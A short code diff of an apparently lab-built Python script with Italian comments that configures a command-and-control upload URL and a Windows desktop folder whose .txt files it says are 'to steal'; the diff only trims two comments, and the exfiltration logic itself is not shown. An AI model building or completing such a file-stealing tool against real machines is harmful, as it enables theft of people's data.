@@ -1,11 +1,11 @@
 import os
 import requests
 
-# Configura il server C2 (modifica con il tuo IP)
+# Configura il server C2
 C2_URL = "http://10.0.2.15:5000/upload"  # L'IP del server Flask dove ricevi i file
 
 # Directory contenente i file da rubare
-TARGET_DIR = r"C:\Users\vboxuser\Desktop\prova"  # Cambia il percorso della cartella
+TARGET_DIR = r"C:\Users\vboxuser\Desktop\prova" 
 
 def find_txt_files(directory):
     """Trova i file .txt nella cartella specificata."""
